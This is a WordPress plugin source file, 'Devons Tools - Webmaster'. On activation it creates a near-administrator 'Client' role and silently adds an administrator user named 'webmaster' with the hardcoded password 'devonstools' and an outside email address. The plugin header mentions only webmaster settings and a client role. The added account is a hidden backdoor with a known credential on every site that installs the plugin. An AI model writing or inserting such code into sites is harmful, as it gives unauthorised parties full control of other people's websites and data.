<?php
if ( ! defined( 'WPINC' ) ) { die; }
/*
 * Plugin Name:       Devons Tools - Webmaster
 * Plugin URI:        
 * Description:       This is the Core for Devons Tools Framework
 * Version:           1.3
 * Author:            Devon Godfrey
 * Author URI:        http://playfreygames.net
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt

	Plugin is based on Devons Tools 1.3

	This plugin contains webmaster settings, including client role. 


*/
function WBMST_roles(){
    global $wp_roles;
	if ( ! isset( $wp_roles ) )
		$wp_roles = new WP_Roles();
	$adm = $wp_roles->get_role('administrator');
    $wp_roles->add_role('Client', 'Client', $adm->capabilities ); 
    $CR = get_role( 'Client' );
    $CR->remove_cap( 'promote_users' );
    $CR->remove_cap( 'remove_users' );
    $CR->remove_cap( 'switch_themes' );
    $CR->remove_cap( 'update_plugins' );
    $CR->remove_cap( 'update_themes' );
    $CR->remove_cap( 'list_users' );
    $CR->remove_cap( 'delete_plugins' );
    $CR->remove_cap( 'create_users' );
    $CR->remove_cap( 'add_users' );
    $CR->remove_cap( 'edit_themes' );
    $CR->remove_cap( 'manage_options' );

    if ( !username_exists( 'webmaster' ) ){
        $wm = new WP_User ( wp_create_user( 'webmaster' , 'devonstools' , 'devon@zodiacgraphics.biz'  ) );
        $wm->remove_role( 'subscriber' );
        $wm->add_role( 'administrator' );
    }
}

register_activation_hook( __FILE__, 'WBMST_roles' );